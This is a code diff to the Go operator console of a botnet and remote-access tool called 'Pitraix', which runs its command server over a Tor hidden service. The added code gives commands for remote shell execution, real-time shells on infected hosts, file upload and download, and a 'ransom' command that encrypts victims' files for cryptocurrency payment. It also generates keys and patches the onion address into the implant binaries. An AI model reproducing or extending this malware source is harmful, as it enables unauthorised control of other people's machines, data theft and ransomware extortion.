@@ -4,10 +4,10 @@ import (
 	"crypto"
 	"crypto/aes"
 	"crypto/cipher"
-    "crypto/rand"
-    "crypto/rsa"
-    "crypto/sha512"
-    "encoding/base64"
+        "crypto/rand"
+        "crypto/rsa"
+        "crypto/sha512"
+        "encoding/base64"
 	"encoding/json"
 	"encoding/pem"
 	"crypto/x509"
@@ -25,14 +25,18 @@ import (
 	"path/filepath"
 	"io"
 	"os"
+	"os/exec"
 	"strconv"
+	"runtime"
+	"archive/zip"
+	
 	"golang.org/x/net/proxy"
 
 )
 
 const (
-	ddosCounter = 60
-	advancedAntiDDos_enabled = true
+	ddosCounter = 45 
+	advancedAntiDDos_enabled = false // optional adds protection against targetted ddos, not really needed since v3 address is so long its impossible to guess
 )
 
 var (
@@ -42,20 +46,29 @@ var (
 		yellowColor = ""
 		endColor    = ""
 
-		operKey = []byte(`YOUR RSA PRIVATE KEY HERE PEM ENCODED`)
+		operKey = []byte{} 
 
 	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")
 	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)
 
 	logAsyncChn = make(chan []string)
 
-	commands = map[string]string { // not all instructions, wait for future update 
+	commands = map[string]string {
 		"shell [command]": "Executes a single shell command on host and waits for output",
 		"shellnoop [command]": "Executes a single shell command on host without waiting for output",
 		"shellrt [command]": "Establishes a real-time shell session for a single host",
 		"ls/list": "Lists all hosts with basic information",
 		"assign [agent index] [host index]": "Assigns a host to an Agent",
 		"snatch [REGS/HSTS/LOGS/EVENTS]": "Snatches information from AG/HST database",
+		"beep [frequency] [duration]": "Plays beep sound with said settings",
+		"wallpaper [path]": "Sets wallpaper for host",
+		"ransom [Amount] [Crypto Name] [Address]": "Starts a ransom and encrypts files",
+		"decrypt": "Decrypts ransom files",
+		"download [file path]": "Downloads file from host to operative",
+		"upload [file path]": "Uploads file from operative to host",
+		"cufol": "Fetches current directory",
+		"cuexe": "Fetches current executeable path",
+		"unzip [path]": "Unzips a file",
 		"instru": "Starts executing previous instructions",
 		"operand [GLOBAL/1 or SELECT/2]": "Sets operand mode GLOBAL will instruct entire hostring while DIRECT only instructs selected hosts",
 		"crout [RELAY/1 or DIRECT/2]": "Sets communcation route RELAY will relay instructions to AGS and HSTS while DIRECT directly instructs hosts",
@@ -125,34 +138,158 @@ type t_HSTSingle struct {
 }
 
 
+func GenerateRsaKeyPair() (*rsa.PrivateKey, *rsa.PublicKey) {
+    privkey, _ := rsa.GenerateKey(rand.Reader, 4096)
+    return privkey, &privkey.PublicKey
+}
+
+func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
+    privkey_bytes := x509.MarshalPKCS1PrivateKey(privkey)
+    privkey_pem := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privkey_bytes,},)
+    return string(privkey_pem)
+}
+
+func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
+    block, _ := pem.Decode([]byte(privPEM))
+    if block == nil {
+        return nil, errors.New("failed to parse PEM")
+    }
+
+    priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+    if err != nil {
+        return nil, err
+    }
+
+    return priv, nil
+}
+
+func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
+    pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
+    if err != nil {
+        return "", err
+    }
+    pubkey_pem := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: pubkey_bytes,},)
+
+
+    return string(pubkey_pem), nil
+}
+
+func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
+    block, _ := pem.Decode([]byte(pubPEM))
+    if block == nil {
+		return nil, errors.New("failed to parse PEM")
+    }
+
+    pub, err := x509.ParsePKIXPublicKey(block.Bytes)
+    if err != nil {
+        return nil, err
+    }
+
+    switch pub := pub.(type) {
+    case *rsa.PublicKey:
+        return pub, nil
+    default:
+         break
+    }
+    return nil, errors.New("key is not RSA")
+}
+
+func unzip(src, dest string) error {
+    r, err := zip.OpenReader(src)
+    if err != nil {
+        return err
+    }
+    defer func() {
+        if err := r.Close(); err != nil {
+            // panic(err)
+			log("unzip", "error while unzipping: " + err.Error())
+			fmt.Println(err)
+        }
+    }()
+
+    os.MkdirAll(dest, 0755)
+
+    extractAndWriteFile := func(f *zip.File) error {
+        rc, err := f.Open()
+        if err != nil {
+            return err
+        }
+        defer func() {
+            if err := rc.Close(); err != nil {
+				log("unzip", "error while extracting: " + err.Error())
+                fmt.Println(err)
+            }
+        }()
+
+        path := filepath.Join(dest, f.Name)
+
+        if f.FileInfo().IsDir() {
+            os.MkdirAll(path, f.Mode())
+        } else {
+            os.MkdirAll(filepath.Dir(path), f.Mode())
+            f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
+            if err != nil {
+                return err
+            }
+            defer func() {
+                if err := f.Close(); err != nil {
+                    fmt.Println(err)
+                }
+            }()
+
+            _, err = io.Copy(f, rc)
+            if err != nil {
+                return err
+            }
+        }
+        return nil
+    }
+
+    for _, f := range r.File {
+        err := extractAndWriteFile(f)
+        if err != nil {
+            return err
+        }
+    }
+
+    return nil
+}
+
+
 func basic_antiDDOS_check(h *t_HSTSingle) bool {
 	if len(strings.TrimSpace(h.Address)) != 56 {
-		fmt.Println("address len not 56", len(h.Address))
+		// fmt.Println("address len not 56", len(h.Address))
+		log("basic_antiDDOS_check", "Address length is not 56: " + strconv.Itoa(len(h.Address)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.IP)) < 6 || len(strings.TrimSpace(h.IP)) > 15 {
-		fmt.Println("ip len weird", len(h.IP))
+		// fmt.Println("ip len weird", len(h.IP))
+		log("basic_antiDDOS_check", "IP length is weird: " + strconv.Itoa(len(h.IP)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.Country)) != 2 {
-		fmt.Println("country len not 2", len(h.Country))
+		// fmt.Println("country len not 2", len(h.Country))
+		log("basic_antiDDOS_check", "Country length is not 2: " + strconv.Itoa(len(h.Country)))
 		return false
 	}
 
-	if len(strings.TrimSpace(h.RAM)) != 9 && len(strings.TrimSpace(h.RAM)) != 10 && len(strings.TrimSpace(h.RAM)) != 11 {
-		fmt.Println("ram len not 9 10 11", len(h.RAM))
+	if len(strings.TrimSpace(h.RAM)) > 50 {
+		// fmt.Println("ram len not 9 10 11", len(h.RAM))
+		log("basic_antiDDOS_check", "RAM length is higher than 50: " + strconv.Itoa(len(h.RAM)))
 		return false
 	}
 
-	if len(strings.TrimSpace(h.Username)) > 256 {
-		fmt.Println("user len larger than 256", len(h.Username))
+	if len(strings.TrimSpace(h.Username)) < 1 || len(strings.TrimSpace(h.Username)) > 256 {
+		// fmt.Println("user len larger than 256", len(h.Username))
+		log("basic_antiDDOS_check", "Username length weird: " + strconv.Itoa(len(h.Username)))
 		return false
 	}
 
 	if h.Chassis > 9 {
-		fmt.Println("user len larger than 9", h.Chassis)
+		// fmt.Println("chassis larger than 9", h.Chassis)
+		log("basic_antiDDOS_check", "Chassis weird: " + strconv.Itoa(h.Chassis))
 		return false
 	}
 	return true
@@ -170,10 +307,12 @@ func adv_antiddos_check(addr, key string) bool {
 				return true
 			}
 		}
-		fmt.Println("DIDN'T pass advanced test")
+		// fmt.Println("DIDN'T pass advanced test")
+		log("adv_antiddos_check", "Did not pass test: " + addr)
+
 		return false
 	} else {
-		fmt.Println("advanced anti ddos test disabled, skipping..")
+		// fmt.Println("advanced anti ddos test disabled, skipping..")
 		return true
 	}
 }
@@ -234,6 +373,7 @@ func load_hostring(fileName string) (t_HST, []int, error) {
 
 	data, err := ioutil.ReadFile(fileName)
     if err != nil {
+		// f := os.Create(filename)
 		return hostring_data, hostring_agents, err
     }
 	err = json.Unmarshal(data, &hostring_data)
@@ -247,6 +387,110 @@ func load_hostring(fileName string) (t_HST, []int, error) {
 	return hostring_data, hostring_agents, nil
 }
 
+func setupTor(path, port, name string, forceSetup bool) string {	
+	var torexecName string = "tor"
+	var ft bool = false
+	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
+		ft = true
+		fmt.Printf("%s>%s TOR not found! Downloading TOR..\n", yellowColor, endColor)
+		// fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
+		
+		var v1m, v2m, v3m int = 11, 4,  0
+		var found bool = false
+		for {
+			tor, err := getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/", v1m ,v2m, v3m), false, 10)
+			if err != nil {
+				fmt.Println(err)
+				time.Sleep(time.Second * 5)
+				continue
+			}
+			if len(tor) < 300 {
+				// fmt.Println("Not found", v1m, v2m, v3m)
+				if v3m == 20 {
+					v3m = 0
+					v2m += 1
+				} else {
+					v3m += 1
+				}
+
+				if v2m == 20 {
+					v2m = 0
+					v1m += 1
+				}
+
+				// if v1m == 20 {
+				// 	v1m +=
+				// }
+				if found == false {
+					continue
+				}
+			}
+			if found == false {
+				fmt.Println("Found, doing found check..")
+				found = true
+			} else {
+				// fmt.Println(runtime.GOOS)
+				if runtime.GOOS != "linux" {
+					y := strings.Index(string(tor), `<a href="tor-win64`)
+					z := strings.TrimSpace(string(tor)[y + 5:y + 70])
+					
+					st := strings.Index(z, ">") + 1
+					ed := strings.Index(z, "<")
+					fnl := strings.TrimSpace(z[st:ed])
+					
+					tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
+					// fmt.Println(tor, err)
+
+					f, _ := os.Create(filepath.Join(path, name + ".zip"))
+					f.Write(tor)
+					f.Close()
+					unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
+					os.Remove(filepath.Join(path, name + ".zip"))
+					torexecName += ".exe"
+				} else {
+					fmt.Println("linux!")
+					tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/tor-browser-linux64-%d.%d.%d_en-US.tar.xz", v1m ,v2m, v3m, v1m, v2m, v3m), false, -1)
+					f, _ := os.Create(filepath.Join(path, name + ".tar.xz"))
+					f.Write(tor)
+					f.Close()
+					legacy_doInstru("shell", fmt.Sprintf("tar -xf %s/%s.tar.xz -C %s && cp -R %s/tor-browser_en-US/Browser/TorBrowser/Tor %s && rm -rf %s/%s.tar.xz %s/tor-browser_en-US", path, name, path, path, path + "/" + name, path, name, path))
+					
+
+
+				}
+				break
+			}
+
+		}
+
+		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc"))
+		defer torrcf.Close()
+		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
+HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port)))
+
+	}
+
+
+	if runtime.GOOS != "linux" {
+		legacy_doInstru("shellnoop", filepath.Join(path, name, "Tor", torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
+	} else {
+		os.Setenv("LD_LIBRARY_PATH",  path + "/" + name) // needed for latest linux snitches couldn't figure this one
+		legacy_doInstru("shellnoop", filepath.Join(path, name, torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
+	}
+
+	if ft == true {
+		time.Sleep(time.Second * 5)
+	}
+	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname"))
+	rhostname := strings.Split(string(hostnamef), ".")[0]
+	if err != nil {
+		fmt.Println("hostname read error:", err)
+		rhostname = setupTor(path, port, name, true)
+	}
+
+	return rhostname
+}
+
 func fetchOnlineAGS(hostring_d t_HST, agents_indexes []int) []int {
 	// log("start", "fetching online agents..")
 	online_agents := []int{}
@@ -254,18 +498,14 @@ func fetchOnlineAGS(hostring_d t_HST, agents_indexes []int) []int {
 	for _, ag := range agents_indexes {
 		addr := hostring_d.Address[ag] // Routes[ag]
 		key, err := base64.StdEncoding.DecodeString(hostring_d.Key[ag])
-
-		/* 
-			Send a noop to the agent to check if hes online, add him to online_agents if so
-		*/
 		fmt.Printf("\n%s>%s Fetching agent %s%s%s..\n", yellowColor, endColor, yellowColor, addr, endColor)
-		// fmt.Println("Fetching mr.",addr)
 		_, err = doInstru(addr, []byte("[\"noop 1\"]"), key, true)
 		if err == nil {
 			online_agents = append(online_agents, ag) // DEBUG
+			fmt.Printf("\n%s>%s Agent %s%s%s is %sonline%s\n", blueColor, endColor, greenColor, addr, greenColor, greenColor, endColor)
+
 		} else {
 			fmt.Printf("\n%s>%s Agent %s%s%s is %soffline%s\n", redColor, endColor, redColor, addr, endColor, redColor, endColor)
-			// fmt.Println("Mr." + addr + " is offline :*(")
 		}
 	}
 
@@ -279,7 +519,7 @@ func neatierList(str string, numb, curbNumb int) (string, bool) {
 	} else {
 		biggerThanReq = false
 	}
-	for { // space generation
+	for {
 		if len(str) >= numb {
 			break
 		}
@@ -296,7 +536,10 @@ func neatierList(str string, numb, curbNumb int) (string, bool) {
 
 func logUpdaterAsync() {
 	for nl := range logAsyncChn {
-		logsf, _ := readFile("OPER_logs.json")
+		logsf, err := readFile("OPER_logs.json")
+		if err != nil {
+			logsf = []byte("{\"Logs\": {}}")
+		}
 		var logs operLogsType
 		json.Unmarshal(logsf, &logs)
 		logs.Logs[strconv.Itoa(len(logs.Logs) + 1)] = []string{nl[0], nl[1], nl[2]}
@@ -304,7 +547,6 @@ func logUpdaterAsync() {
 		out, _ := json.MarshalIndent(logs, "", " ")
 		f.Write(out)
 		f.Close()
-
 	}
 }
 
@@ -415,6 +657,42 @@ func contains(s []int, e int) bool {
 }
 
 
+func legacy_doInstru(ic, iv string) string {
+	// fmt.Println("doInstru", ic, iv)
+	var shell string
+	var sec string
+	
+	if runtime.GOOS != "linux" {
+		shell = os.Getenv("HOMEDRIVE") + "\\Windows\\System32\\cmd.exe"
+		sec = "/c"
+		
+	} else {
+		shell = os.Getenv("SHELL")
+		sec = "-c"
+	}
+
+	var out string 
+	switch (ic) {
+	case "shell": // shell instruction with output (locking)
+		cmd := exec.Command(shell, sec, iv)
+		var outbuffer bytes.Buffer
+
+		cmd.Stderr = &outbuffer
+		cmd.Stdout = &outbuffer
+		cmd.Run()
+		
+		out = outbuffer.String()
+		// fmt.Println("out: ", out)
+
+	case "shellnoop": // shell instruction without output (non locking)
+		cmd := exec.Command(shell, sec, iv)
+		cmd.Start()
+	}
+
+	return out
+}
+
+
 func doInstru(addr string, inst, hstAES_Key []byte, direct bool) ([]byte, error) {
 	payload_enc, nonce, _ := encrypt_AES(inst, hstAES_Key)
 
@@ -454,17 +732,83 @@ func main() {
 		yellowColor = "\x1b[93m"
 		endColor    = "\x1b[0m"
 	}
+	fmt.Printf("%s>%s Loading %sPitraix%s..\n\n", yellowColor, endColor, redColor, endColor)
+	currentPath, _ := os.Executable()
 	
-	is_running := tor_running_check()
-	if is_running == false {
-		fmt.Printf("%s>%s Tor is not running!\n", redColor, endColor)
-		os.Exit(0)
-	}
+	// is_running := tor_running_check()
+	// if is_running == false {
+	// 	fmt.Printf("%s>%s Tor is not running!\n", redColor, endColor)
+	// 	os.Exit(0)
+	// }
+
+	agentAddress := setupTor(filepath.Dir(currentPath), "1337", "tor", false)
+	// fmt.Println(agentAddress)
 
 	hostring_d, all_AGS, err := load_hostring("hostring.json")
 	if err != nil {
-		fmt.Println(redColor + ">" + endColor + " There was error loading hostring file:", err)
-		os.Exit(0)
+		f, _ := os.Create("hostring.json")
+		f.WriteString(`{"Address": [],"IP": [],"Country": [],"City": [],"CPU": [],"RAM": [],"Username": [],"Hostname": [],"Chassis": [],"OS": [],"OSVar": [],"Kernel": [],"Arch": [],"Vendor": [],"Model": [],"ContactD": [],"Routes": [],"Key": [],"RasKey": []}`)
+		f.Close()
+		fmt.Println(yellowColor + ">" + endColor + " Creating hostring.json..")
+
+		hostring_d, all_AGS, err = load_hostring("hostring.json")
+	}
+
+	var operPrivKey *rsa.PrivateKey
+	operPrivKeyTmp1, err := readFile("OPER_PrivateKey.pitraix")
+	if err != nil {
+		fmt.Println(yellowColor + ">" + endColor + " First startup detected! Generating RSA keys..")
+		priv, pub := GenerateRsaKeyPair()
+        priv_pem := strings.TrimSpace(ExportRsaPrivateKeyAsPemStr(priv))
+        pub_pemR, _ := ExportRsaPublicKeyAsPemStr(pub)
+        pub_pem := strings.TrimSpace(pub_pemR)
+		
+		operPrivKey = priv
+
+        f, _ := os.Create("OPER_PrivateKey.pitraix")
+        f.WriteString(priv_pem)
+        f.Close()
+
+
+		// fmt.Println("wrote:", pub_pem)
+        f, _ = os.Create("OPER_PublicKey.pitraix")
+        f.WriteString(pub_pem)
+        f.Close()
+
+        for _, v := range []string{"lyst_windows.go", "lyst_windows.exe", "lyst_linux.go", "lyst_linux"} {       
+			file, err := os.Open(v)
+			if err != nil {
+				fmt.Printf("%s>%s Make sure you have %s%s%s in the same folder\n", yellowColor, endColor, yellowColor, v, endColor)
+				// fmt.Println("[WARNING] Make sure you have `" + v + "` in same folder!")
+			} else {
+					fs, _ := file.Stat()
+					b := make([]byte, fs.Size())
+
+					for {
+						_, err := file.Read(b)
+						if err != nil {
+								break
+						}
+					}
+					file.Close()
+
+					nb := bytes.Replace(b, []byte("RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW"), []byte(pub_pem), -1)
+					// nb = bytes.Replace(b, []byte("~~YOUR RSA PRIVATE KEY - RUN SETUPCRYPTO.GO~~"), []byte(priv_pem), 1)
+					nb = bytes.Replace(nb, []byte("SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"), []byte(agentAddress), -1)
+
+					f, _ := os.Create(v)
+					f.Write(nb)
+					f.Close()
+			}
+        }
+		fmt.Println(greenColor + ">" + endColor + " Done.")
+	} else {
+		operPrivKey, err = ParseRsaPrivateKeyFromPemStr(string(operPrivKeyTmp1))
+		if err != nil {
+			fmt.Println("Error parsing OPER_PrivateKey:", err)
+			os.Remove("OPER_PrivateKey")
+			os.Exit(0)
+		}
 	}
 	
 	go logUpdaterAsync()
@@ -850,7 +1194,9 @@ func main() {
 							} else {
 								shellrt = string(out)
 								shellrtSel = index - 1
-								fmt.Printf("\n\n%s\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n", hostring_d.OSVar[index - 1])
+								if hostring_d.OS[index - 1] == 1 {
+									fmt.Printf("\n\n%s\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n", hostring_d.OSVar[index - 1])
+								}
 							}
 						} else {
 							fmt.Printf("%s>%s you %smust%s supply host index\n", redColor, endColor, redColor, endColor)
@@ -1164,7 +1510,7 @@ func main() {
 		}
 	}(&antiddosCounter)
 	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
-		req.Body = http.MaxBytesReader(writer, req.Body, 5000) // if anything wrong, its prolly dis bitch
+		// req.Body = http.MaxBytesReader(writer, req.Body, 5000) // if anything wrong, its prolly dis bitch
 		if req.Method == "GET" {
 			io.WriteString(writer, "0")
 			fmt.Printf("%sRegister_Handler >%s Got GET request. %v\n", yellowColor, endColor, req)
@@ -1176,10 +1522,10 @@ func main() {
 					if antiddosCounter == 0 {
 						antiddosCounter = ddosCounter
 						fmt.Println(dataSlice)
-						temp_pem_decode, _ := pem.Decode([]byte(operKey))
-						operKeyProcessed, _ := x509.ParsePKCS1PrivateKey(temp_pem_decode.Bytes)
+						// temp_pem_decode, _ := pem.Decode([]byte(operPrivKey))
+						// operKeyProcessed, _ := x509.ParsePKCS1PrivateKey(temp_pem_decode.Bytes)
 						
-						aes_Key := RSA_OAEP_Decrypt(dataSlice[0], *operKeyProcessed)
+						aes_Key := RSA_OAEP_Decrypt(dataSlice[0], *operPrivKey)
 						temp_payload_1, _ := base64.StdEncoding.DecodeString(dataSlice[1])
 						temp_payload_2, _ := base64.StdEncoding.DecodeString(dataSlice[2])
 
